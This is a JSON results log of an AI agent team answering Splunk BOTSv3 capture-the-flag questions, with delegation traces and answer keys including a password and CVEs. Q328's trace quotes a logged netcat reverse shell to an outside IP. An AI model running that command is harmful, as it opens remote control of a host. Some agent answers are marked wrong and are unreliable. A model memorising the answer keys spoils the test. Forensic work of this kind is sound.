@@ -1,0 +1,368 @@
+{
+  "Q332": {
+    "points": 1000,
+    "question": "What is the CVE of the vulnerability that escalated permissions on Linux host hoth?",
+    "kind": "correct",
+    "final_answer": "cve-2017-16995",
+    "verdict": "CORRECT",
+    "submitted": "cve-2017-16995",
+    "official": "cve-2017-16995",
+    "entries": [
+      {
+        "tier": "sh",
+        "type": "delegate",
+        "content": "Task 1 \u2192 Senior #122: In Splunk `index=botsv3` for August 2018, investigate Linux host `hoth` (`192.168.9.30`) for all telemetry related to the privilege-escalation chain executed by user `tomcat8`: `/tmp/colonel`, `/tmp/c"
+      },
+      {
+        "tier": "senior",
+        "type": "investigate",
+        "content": "[failed] Intention: I need to see all available sourcetypes to identify which ones contain Linux process, file, and network telemetry for host `hoth`.\n\u2192 call get_source_types()",
+        "spl": "[]"
+      },
+      {
+        "tier": "sh",
+        "type": "delegate",
+        "content": "Task 2 \u2192 Senior #123: In Splunk `index=botsv3` for August 2018, search for evidence linking the `colonel.c` / `colonelnew` privilege-escalation exploit on Linux host `hoth` to a public exploit or CVE. Use any indexed explo"
+      },
+      {
+        "tier": "senior",
+        "type": "investigate",
+        "content": "[failed] Intention: Let me check what sourcetypes have data from host hoth by searching across several key sourcetypes. Let me also try searching for \"colonel\" in syslog and linux_audit on hoth.\n\u2192 call run_splunk_search<arg_key>max_results</arg_key><arg_value>50</arg_value><arg_key>query</arg_key><arg_value>index=botsv3 host=hoth | stats count by sourcetype | sort -count</arg_value></tool_call>",
+        "spl": "['index=botsv3 sourcetype=code42:security files{}.md5=\"a38e52b80028516698c966acab2f4bef\" | stats count by host, files{}.fileName, files{}.fullPath, files{}.md5', 'index=botsv3 colonel | stats count b\u2026"
+      },
+      {
+        "tier": "sh",
+        "type": "delegate",
+        "content": "Task 3 \u2192 Senior #124: Given [Task-1 (failed): Intention: I need to see all available sourcetypes to identify which ones contain Linux process, file, and network telemetry for host `hoth`.\n\u2192 call get_source_types()] and [Ta"
+      },
+      {
+        "tier": "senior",
+        "type": "investigate",
+        "content": "[failed] Intention: I have the source types list. Now I need to find which sourcetypes have data from host `hoth` and look for privilege escalation activity. Let me search across several relevant sourcetypes for hoth.\n\u2192 call run_splunk_search(query=\"index=botsv3 sourcetype=stream:tcp host=hoth | stats count by sourcetype\", max_results=50)<tool_call>run_splunk_search<arg_key>query=\"index=botsv3 sourcetype=s",
+        "spl": "['index=botsv3 host=hoth | stats count by sourcetype | sort -count']"
+      },
+      {
+        "tier": "sh",
+        "type": "delegate",
+        "content": "Task 1 \u2192 Senior #125: In Splunk `index=botsv3`, enumerate all sourcetypes and events for host `hoth` around the `tomcat8` compromise, then specifically search those sources for `/tmp/colonel`, `colonel.c`, `colonelnew`, `g"
+      },
+      {
+        "tier": "senior",
+        "type": "investigate",
+        "content": "[partial] ## PARTIAL ANSWER\n\nBased on the stream:http events on host `hoth`, I found a complete Apache Struts2 OGNL injection attack chain targeting Tomcat8 (port 8080) at `/frothlyinventory/integration/saveGangster.action`. The attack delivered a **Linux kernel BPF privilege escalation exploit**. Here are all literal strings identifying the exploit family:\n\n### Exploit Delivery (Struts2 OGNL Injection)\n- *",
+        "spl": "['index=botsv3 host=hoth | stats count by sourcetype | sort -count', 'index=botsv3 host=hoth sourcetype=bash_history | stats count by sourcetype', 'index=botsv3 host=hoth sourcetype=bash_history colo\u2026"
+      },
+      {
+        "tier": "sh",
+        "type": "delegate",
+        "content": "Task 2 \u2192 Senior #126: In Splunk `index=botsv3`, search all raw events for the MD5 `a38e52b80028516698c966acab2f4bef` and for common Linux local privilege-escalation CVE names/strings likely associated with compiled C explo"
+      },
+      {
+        "tier": "senior",
+        "type": "investigate",
+        "content": "[partial] PARTIAL ANSWER: The MD5 hash `a38e52b80028516698c966acab2f4bef` is directly correlated to the `hoth` artifact \u2014 it belongs to the file `/tmp/colonel.c` (size: 5775 bytes, SHA256: `3be212f1aaa4008e75f61e606ef187bf1ab1d31b1fab7c015dcb219cb3943b14`), created by user `tomcat8` (uid 111) on host `hoth`. The file was compiled via `gcc colonel.c -o colonelnew` by uid 111. The FIM events on hoth also show",
+        "spl": "['index=botsv3 sourcetype=symantec:ep:behavior:file MD5=a38e52b80028516698c966acab2f4bef | stats count by host, source', 'index=botsv3 (\\\\\"Dirty COW\\\\\" OR \\\\\"dirtycow\\\\\" OR \\\\\"dirty_cow\\\\\" OR \\\\\"over\u2026"
+      },
+      {
+        "tier": "extractor",
+        "type": "answer",
+        "content": "cve-2017-16995",
+        "verdict": "CORRECT"
+      }
+    ]
+  },
+  "Q333": {
+    "points": 1000,
+    "question": "What is the CVE of the vulnerability that was exploited to run commands on Linux host hoth?",
+    "kind": "correct",
+    "final_answer": "cve-2017-9791",
+    "verdict": "CORRECT",
+    "submitted": "cve-2017-9791",
+    "official": "cve-2017-9791",
+    "entries": [
+      {
+        "tier": "sh",
+        "type": "delegate",
+        "content": "Task 1 \u2192 Senior #127: In Splunk `index=botsv3` for August 2018, investigate web and network telemetry for Linux host `hoth` (`192.168.9.30`) around requests to `/frothlyinventory/integration/saveGangster.action`. Search `s"
+      },
+      {
+        "tier": "senior",
+        "type": "investigate",
+        "content": "[partial] PARTIAL ANSWER:\n\n## Exploit Payload Characteristics (from `stream:http`)\n\n**Target**: `192.168.9.30` (hoth), port 8080\n**Source**: `192.168.8.103`\n**URI**: `/frothlyinventory/integration/saveGangster.action`\n**HTTP Method**: POST\n**User-Agent**: `python-requests/2.18.4`\n**Server response header**: `Apache-Coyote/1.1`\n**Status**: 200 (all requests successful)\n**Total requests**: 15 (13 with OGNL pa",
+        "spl": "['index=botsv3 sourcetype=stream:http uri_path=\"/frothlyinventory/integration/saveGangster.action\" | stats count by src_ip, dest_ip, http_method, http_user_agent, status, site', 'index=botsv3 sourcet\u2026"
+      },
+      {
+        "tier": "sh",
+        "type": "delegate",
+        "content": "Task 2 \u2192 Senior #128: In Splunk `index=botsv3` for August 2018, map the observed OGNL injection and command-execution behavior on Linux host `hoth` (`192.168.9.30`) at `/frothlyinventory/integration/saveGangster.action` to"
+      },
+      {
+        "tier": "senior",
+        "type": "investigate",
+        "content": "[failed] ",
+        "spl": "['index=botsv3 sourcetype=stream:http dest_ip=\"192.168.9.30\" | stats count by uri_path, http_method', 'index=botsv3 sourcetype=stream:http dest_ip=\"192.168.9.30\" uri_path=\"/frothlyinventory/integrati\u2026"
+      },
+      {
+        "tier": "sh",
+        "type": "delegate",
+        "content": "Task 3 \u2192 Senior #129: Given [Task-1 (partial): PARTIAL ANSWER:\n\n## Exploit Payload Characteristics (from `stream:http`)\n\n**Target**: `192.168.9.30` (hoth), port 8080\n**Source**: `192.168.8.103`\n**URI**: `/frothlyinventory/"
+      },
+      {
+        "tier": "senior",
+        "type": "investigate",
+        "content": "[solved] Intention: The web lookup confirms that CVE-2017-9791 (S2-048) is the vulnerability exploited via the `saveGangster.action` endpoint in the Struts2 Showcase application. The exploit matches exactly: OGNL injection via a POST to `saveGangster.action`, using the Struts 1 plugin in Apache Struts 2.3.x. The payload in the BOTSv3 data uses `@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS` and clears excluded p",
+        "spl": "['index=botsv3 sourcetype=stream:http dest=192.168.9.30 uri=\"/frothlyinventory/integration/saveGangster.action\" | stats count by uri, http_method, status, useragent, dest_port', 'index=botsv3 sourcet\u2026"
+      },
+      {
+        "tier": "extractor",
+        "type": "answer",
+        "content": "cve-2017-9791",
+        "verdict": "CORRECT"
+      }
+    ]
+  },
+  "Q303": {
+    "points": 100,
+    "question": "What is the password for the user that was successfully created by the user \"root\" on the on-premises Linux system?",
+    "kind": "refusal",
+    "final_answer": "The password is not provided in the context.",
+    "verdict": "WRONG",
+    "submitted": "The password is not provided in the context.",
+    "official": "ilovedavidverve",
+    "entries": [
+      {
+        "tier": "sh",
+        "type": "delegate",
+        "content": "Task 1 \u2192 Senior #9: In Splunk `index=botsv3` for August 2018, search Linux authentication, syslog, audit, and account-management sourcetypes on on-premises Linux systems for events showing `root` successfully creating a"
+      },
+      {
+        "tier": "senior",
+        "type": "investigate",
+        "content": "[partial] PARTIAL ANSWER: I found 21 `ADD_USER` audit events across 3 on-premises Linux hosts, all executed by `uid=0` (root) via `/usr/sbin/useradd` with `res=success`. The events show root creating users with IDs 48, 497, 498, and 500, as well as adding `ec2-user` to groups and creating home directories.\n\n**Key findings:**\n\n| Host | Timestamp (UTC+8) | User ID Created | Operation | Raw Evidence |\n|------|",
+        "spl": "['index=botsv3 sourcetype=linux_audit type=ADD_USER res=success | stats count by host _time src_user user id object_id acct command exe _raw', 'index=botsv3 sourcetype=linux_audit type=ADD_USER | sta\u2026"
+      },
+      {
+        "tier": "sh",
+        "type": "delegate",
+        "content": "Task 2 \u2192 Senior #10: In Splunk `index=botsv3` for August 2018, independently search Linux shell/process/audit telemetry on on-premises Linux systems for password-setting activity performed by `root` around any user creati"
+      },
+      {
+        "tier": "senior",
+        "type": "investigate",
+        "content": "[partial] PARTIAL ANSWER: I found multiple user creation events in `linux_secure` and `linux_audit` on on-premises Linux hosts, but I was unable to locate the adjacent password-setting activity that reveals the plaintext password before reaching the tool call limit.\n\n**User creation events found (linux_secure):**\n- Host `ip-172-16-0-13` at 2018-08-20T22:25:47+08:00: `useradd[2875]: new user: name=streamfwd,",
+        "spl": "[]"
+      },
+      {
+        "tier": "sh",
+        "type": "delegate",
+        "content": "Task 3 \u2192 Senior #11: Given [Task-1 (partial): PARTIAL ANSWER: I found 21 `ADD_USER` audit events across 3 on-premises Linux hosts, all executed by `uid=0` (root) via `/usr/sbin/useradd` with `res=success`. The events show"
+      },
+      {
+        "tier": "senior",
+        "type": "investigate",
+        "content": "[partial] PARTIAL ANSWER: The users created by root on the on-premises Linux hosts were `ec2-user` (UID 500, shell=/bin/bash), `apache` (UID 48), `memcached` (UID 498), and `streamfwd` (UID 497). The `ec2-user` account is the most likely candidate for having a password set, as it is the only one with a login shell (`/bin/bash`). However, I was unable to locate the plaintext password despite searching `linux",
+        "spl": "[]"
+      },
+      {
+        "tier": "sh",
+        "type": "delegate",
+        "content": "Task 1 \u2192 Senior #12: In Splunk `index=botsv3` for August 20, 2018 around 22:25 local / nearby UTC, pivot on host `ip-172-16-0-13` and the newly created users `ec2-user`, `apache`, `memcached`, and `streamfwd` across `bash"
+      },
+      {
+        "tier": "senior",
+        "type": "investigate",
+        "content": "[partial] ## PARTIAL ANSWER\n\nBased on my investigation across multiple sourcetypes on host `ip-172-16-0-13`, I found limited direct evidence of password-setting commands:\n\n**What I found:**\n- `bash_history` on the host contains `cat /etc/passwd` at `2018-08-20T19:35:50+08:00` (11:35:50 UTC) \u2014 confirms the attacker was inspecting the passwd file, but this is not a password-setting command itself.\n\n**What I s",
+        "spl": "[]"
+      },
+      {
+        "tier": "sh",
+        "type": "delegate",
+        "content": "Task 2 \u2192 Senior #13: Search all sourcetypes in `index=botsv3` for the usernames `streamfwd`, `memcached`, and `ec2-user` combined with likely password-setting indicators (`password`, `passwd`, `chpasswd`, `usermod -p`, `e"
+      },
+      {
+        "tier": "senior",
+        "type": "investigate",
+        "content": "[partial] PARTIAL ANSWER: I confirmed that events matching the usernames (`streamfwd`, `memcached`, `ec2-user`) combined with password-setting indicators (`password`, `passwd`, `chpasswd`, `usermod`, `echo`, `openssl`, `CHAUTHTOK`) exist in three sourcetypes:\n\n- **cloud-init** \u2014 3 events across hosts: `gacrux.i-06fea586f3d3c8ce8`, `gacrux.i-09cbc261e84259b54`, `gacrux.i-0cc93bade2b3cba63`\n- **cloud-init-out",
+        "spl": "['index=botsv3 (sourcetype=bash_history OR sourcetype=cloud-init OR sourcetype=cloud-init-output OR sourcetype=bootstrap OR sourcetype=linux_secure OR sourcetype=linux_audit OR sourcetype=osquery:res\u2026"
+      },
+      {
+        "tier": "extractor",
+        "type": "answer",
+        "content": "The password is not provided in the context.",
+        "verdict": "WRONG"
+      }
+    ]
+  },
+  "Q328": {
+    "points": 1000,
+    "question": "What text is displayed on line 2 of the file used to escalate tomcat8's permissions to root?",
+    "kind": "refusal",
+    "final_answer": "I cannot provide the specific text from the file as I do not have access to the Splunk index `botsv3` or the host `hoth` to inspect the raw events and file contents. The information required to answer this question is not present in the provided context.",
+    "verdict": "WRONG",
+    "submitted": "I cannot provide the specific text from the file as I do not have access to the Splunk index `botsv3` or the host `hoth` to inspect the raw events and file contents. The information required to answer this question is not present in the provided context.",
+    "official": "* Ubuntu 16.04.4 kernel priv esc",
+    "entries": [
+      {
+        "tier": "sh",
+        "type": "delegate",
+        "content": "Task 1 \u2192 Senior #104: In Splunk `index=botsv3` for August 2018, investigate Linux host `hoth` (`192.168.9.30`) for privilege escalation activity involving user `tomcat8` becoming `root`. Search sourcetypes such as `bash_hi"
+      },
+      {
+        "tier": "senior",
+        "type": "investigate",
+        "content": "[partial] PARTIAL ANSWER: The privilege escalation file is `/tmp/colonel` (base64-encoded payload) which was decoded to `/tmp/colonel.c` (C source code) and then compiled/executed as `./colonelnew` by user `tomcat8` on host `hoth`.\n\nKey evidence from `osquery:results` on host `hoth`:\n\n1. **Process monitoring** (`pack_process-monitoring_proc_events`) shows tomcat8 running:\n   - `./colonelnew` \u2014 the compiled",
+        "spl": "['index=botsv3 sourcetype=linux_secure host=hoth | stats count by user_name, action | sort -count', 'index=botsv3 sourcetype=syslog host=hoth | stats count by user | sort -count', 'index=botsv3 host=\u2026"
+      },
+      {
+        "tier": "sh",
+        "type": "delegate",
+        "content": "Task 2 \u2192 Senior #105: In Splunk `index=botsv3` for August 2018, once you locate candidate privilege-escalation files on Linux host `hoth` tied to `tomcat8` and the exploitation of `/frothlyinventory/showcase.action`, retri"
+      },
+      {
+        "tier": "senior",
+        "type": "investigate",
+        "content": "[partial] PARTIAL ANSWER: The candidate privilege-escalation file on Linux host `hoth` is a binary called **`colonelnew`**, running as user `tomcat8` (PIDs 17283 and 9456). This was found alongside a reverse shell (`bash -c /bin/sh 0</tmp/backpipe | nc 45.77.53.176 8088 1>/tmp/backpipe`) also running as `tomcat8`, indicating the attacker exploited the Tomcat service (likely via the Struts2 `/frothlyinventor",
+        "spl": "['index=botsv3 sourcetype=stream:http \"/frothlyinventory/showcase.action\" | stats count by host, src, dest, uri, status', 'index=botsv3 sourcetype=stream:http showcase* | stats count by host, src, de\u2026"
+      },
+      {
+        "tier": "sh",
+        "type": "delegate",
+        "content": "Task 3 \u2192 Senior #106: Given [Task-1 (partial): PARTIAL ANSWER: The privilege escalation file is `/tmp/colonel` (base64-encoded payload) which was decoded to `/tmp/colonel.c` (C source code) and then compiled/executed as `."
+      },
+      {
+        "tier": "senior",
+        "type": "investigate",
+        "content": "[partial] PARTIAL ANSWER: The privilege escalation file is `/tmp/colonel.c` (5775 bytes, C source code, MD5: `a38e52b80028516698c966acab2f4bef`), which was base64-decoded from `/tmp/colonel` and compiled to `colonelnew` by user `tomcat8` on host `hoth` (192.168.9.30). The attacker used the Struts2 OGNL injection exploit at `/frothlyinventory/integration/saveGangster.action` to execute commands including `ba",
+        "spl": "['index=botsv3 colonel | stats count by sourcetype', 'index=botsv3 sourcetype=osquery:results colonel | stats count by name', 'index=botsv3 sourcetype=stream:http colonel | stats count by host, uri,\u2026"
+      },
+      {
+        "tier": "sh",
+        "type": "delegate",
+        "content": "Task 1 \u2192 Senior #107: In Splunk `index=botsv3`, search `hoth` telemetry for raw content of `/tmp/colonel.c`, especially commands like `cat /tmp/colonel.c`, heredocs, echoed/base64-decoded source, web request `form_data` to"
+      },
+      {
+        "tier": "senior",
+        "type": "investigate",
+        "content": "[partial] PARTIAL ANSWER: I confirmed that host \"hoth\" exists in the BOTSv3 dataset with 83 bash_history events and 79,098 osquery:results events (including 1,440 shell_history entries and 406 FIM file events). However, I could not find any events containing \"colonel\", \"saveGangster\", \"Gangster\", or \"frothlyinventory\" across the sourcetypes I checked (bash_history, stream:http, osquery:results). The stream:",
+        "spl": "['index=botsv3 sourcetype=bash_history colonel', 'index=botsv3 sourcetype=bash_history colonel | stats count by host, _raw', 'index=botsv3 colonel | stats count by sourcetype, host', 'index=botsv3 so\u2026"
+      },
+      {
+        "tier": "sh",
+        "type": "delegate",
+        "content": "Task 2 \u2192 Senior #108: In Splunk `index=botsv3`, pivot from `/tmp/colonel` and `/tmp/colonel.c` on host `hoth` across `osquery:results`, `stream:http`, `suricata`, `ps`, `bash_history`, and raw events to reconstruct the sou"
+      },
+      {
+        "tier": "senior",
+        "type": "investigate",
+        "content": "[failed] ",
+        "spl": "['index=botsv3 (sourcetype=osquery:results OR sourcetype=stream:http OR sourcetype=ps OR sourcetype=bash_history) host=hoth colonel | stats count by sourcetype', 'index=botsv3 host=hoth sourcetype=su\u2026"
+      },
+      {
+        "tier": "extractor",
+        "type": "answer",
+        "content": "I cannot provide the specific text from the file as I do not have access to the Splunk index `botsv3` or the host `hoth` to inspect the raw events and file contents. The information required to answer this question is not present in the provided context.",
+        "verdict": "WRONG"
+      }
+    ]
+  },
+  "Q330": {
+    "points": 1000,
+    "question": "What Frothly VPN user generated the most traffic?",
+    "kind": "wrong",
+    "final_answer": "bstoll",
+    "verdict": "WRONG",
+    "submitted": "bstoll",
+    "official": "mkraeusen",
+    "entries": [
+      {
+        "tier": "sh",
+        "type": "delegate",
+        "content": "Task 1 \u2192 Senior #114: In Splunk `index=botsv3` for August 2018, identify the sourcetype(s) that contain Frothly VPN session or remote-access logs with usernames and traffic byte counts. Prioritize common VPN/network source"
+      },
+      {
+        "tier": "senior",
+        "type": "investigate",
+        "content": "[partial] PARTIAL ANSWER: The sourcetype **`cisco:asa`** contains Frothly VPN session/remote-access logs with usernames and traffic byte counts. The host is `FROTHLY-FW1` (Cisco ASA firewall), and VPN events are identified by the keyword `DefaultWEBVPNGroup` (24 total events on Aug 20, 2018).\n\n**Relevant fields:**\n- `Username` \u2014 VPN username (extracted field; values: abungstein, bstoll, pcerf)\n- `user` \u2014 VP",
+        "spl": "['index=botsv3 sourcetype=cisco:asa Username=* | stats count by Username, Group, IP, bytes, user', 'index=botsv3 sourcetype=cisco:asa (Username=* OR Group=* OR user=*) | stats count by Username, Grou\u2026"
+      },
+      {
+        "tier": "sh",
+        "type": "delegate",
+        "content": "Task 2 \u2192 Senior #115: In Splunk `index=botsv3` for August 2018, using the VPN sourcetype(s) discovered, calculate total traffic generated by each Frothly VPN user by summing the available byte-count fields for all sessions"
+      },
+      {
+        "tier": "senior",
+        "type": "investigate",
+        "content": "[solved] I have all the data needed to provide a confident answer. Let me verify the math:\n\n**bstoll** (2 sessions):\n- Session 1: xmt=18,775 + rcv=768,481 = 787,256\n- Session 2: xmt=54,866,966 + rcv=9,637,348 = 64,504,314\n- **Total: 65,291,570 bytes** \u2713\n\n**pcerf** (1 session): 2,879,250 + 7,084,758 = 9,964,008 \u2713\n\n**abungstein** (1 session): 446,430 + 9,130,186 = 9,576,616 \u2713\n\n---\n\n## FINAL ANSWER\n\n**Top VPN",
+        "spl": "['index=botsv3 sourcetype=cisco:asa \"113019\" | stats count by Username', 'index=botsv3 sourcetype=cisco:asa \"113019\" | rex \"Bytes xmt:\\\\s*(?<bytes_xmt>\\\\d+),\\\\s*Bytes rcv:\\\\s*(?<bytes_rcv>\\\\d+)\" | ev\u2026"
+      },
+      {
+        "tier": "sh",
+        "type": "delegate",
+        "content": "Task 3 \u2192 Senior #116: Given [Task-1 (partial): PARTIAL ANSWER: The sourcetype **`cisco:asa`** contains Frothly VPN session/remote-access logs with usernames and traffic byte counts. The host is `FROTHLY-FW1` (Cisco ASA fir"
+      },
+      {
+        "tier": "senior",
+        "type": "investigate",
+        "content": "[solved] The data is clear and verified. **bstoll** generated 65,291,570 bytes across 2 VPN sessions \u2014 far more than pcerf (9,964,008) or abungstein (9,576,616).\n\n**FINAL ANSWER:** bstoll\n\n**SPL:** `index=botsv3 sourcetype=cisco:asa \"Session disconnected\" \"DefaultWEBVPNGroup\" | rex \"Username = (?<vpn_user>\\w+).*Bytes xmt: (?<bytes_xmt>\\d+).*Bytes rcv: (?<bytes_rcv>\\d+)\" | eval total_bytes = bytes_xmt + byt",
+        "spl": "['index=botsv3 sourcetype=cisco:asa \"Session disconnected\" \"DefaultWEBVPNGroup\" | rex \"Username = (?<vpn_user>\\\\w+).*Bytes xmt: (?<bytes_xmt>\\\\d+).*Bytes rcv: (?<bytes_rcv>\\\\d+)\" | eval total_bytes =\u2026"
+      },
+      {
+        "tier": "extractor",
+        "type": "answer",
+        "content": "bstoll",
+        "verdict": "WRONG"
+      }
+    ]
+  },
+  "Q224": {
+    "points": 1000,
+    "question": "Frothly uses Amazon Route 53 for their DNS web service. What is the average length of the distinct third-level subdomains in the queries to brewertalk.com?",
+    "kind": "wrong",
+    "final_answer": "3.00",
+    "verdict": "WRONG",
+    "submitted": "3.00",
+    "official": "8.10",
+    "entries": [
+      {
+        "tier": "sh",
+        "type": "delegate",
+        "content": "Task 1 \u2192 Senior #87: In Splunk `index=botsv3` for August 2018, search DNS-related sourcetypes such as `stream:dns`, `bro:dns`, or any Route 53 query logs for queries ending in `brewertalk.com`. Extract the immediate third"
+      },
+      {
+        "tier": "senior",
+        "type": "investigate",
+        "content": "[solved] Based on my thorough investigation, here's what I found:\n\n**DNS queries ending in `brewertalk.com` across all DNS-related sourcetypes:**\n\n| Field | FQDN | Count |\n|-------|------|-------|\n| `query` | `www.brewertalk.com` | 107 |\n| `query{}` | `www.brewertalk.com` | 60 |\n| `name{}` | `www.brewertalk.com` | 152 |\n| `name{}` | `brewertalk.com` | 84 |\n\nThe `name{}` field also shows `brewertalk.com` (n",
+        "spl": "['index=botsv3 sourcetype=stream:dns query=*brewertalk.com | stats count by query | sort -count', 'index=botsv3 sourcetype=stream:dns | regex query=\"brewertalk\\\\.com$\" | stats count by query | sort -\u2026"
+      },
+      {
+        "tier": "sh",
+        "type": "delegate",
+        "content": "Task 2 \u2192 Senior #88: In Splunk `index=botsv3` for August 2018, independently identify the best DNS data source for `brewertalk.com` queries and calculate the average length of distinct third-level subdomains under `brewer"
+      },
+      {
+        "tier": "senior",
+        "type": "investigate",
+        "content": "[partial] PARTIAL ANSWER: The best DNS data source is `stream:dns` (the only DNS sourcetype in BOTSv3). After exhaustive searching of the `query`, `query{}`, `name{}`, and `queries` fields, the only third-level subdomain under `brewertalk.com` is `www` (from `www.brewertalk.com`). Bare `brewertalk.com` appears in the `name{}` field (19 events) but is correctly excluded per the question's instructions. The N",
+        "spl": "['index=botsv3 sourcetype=stream:dns query=*brewertalk.com | stats count by query | sort -count', 'index=botsv3 sourcetype=stream:dns query=\"brewertalk.com\" OR query=\"*.brewertalk.com\" | stats count\u2026"
+      },
+      {
+        "tier": "sh",
+        "type": "delegate",
+        "content": "Task 3 \u2192 Senior #89: Given [Task-1 (solved): Based on my thorough investigation, here's what I found:\n\n**DNS queries ending in `brewertalk.com` across all DNS-related sourcetypes:**\n\n| Field | FQDN | Count |\n|-------|----"
+      },
+      {
+        "tier": "senior",
+        "type": "investigate",
+        "content": "[solved] Intention: I've now thoroughly searched all DNS-related fields across all relevant sourcetypes. Let me compile my findings:\n\n**Summary of investigation:**\n\n1. **`stream:dns`** (the only DNS sourcetype in BOTSv3):\n   - `query` field: only `www.brewertalk.com` (107 events)\n   - `query{}` field: only `www.brewertalk.com` (60 events)\n   - `queries` field: only `www.brewertalk.com` (60 events)\n   - `na",
+        "spl": "['index=botsv3 sourcetype=stream:dns query=*brewertalk.com | stats count by query | sort -count', 'index=botsv3 sourcetype=stream:dns query=\"*brewertalk.com\" | stats count by query | sort -count', 'i\u2026"
+      },
+      {
+        "tier": "extractor",
+        "type": "answer",
+        "content": "3.00",
+        "verdict": "WRONG"
+      }
+    ]
+  }
+}
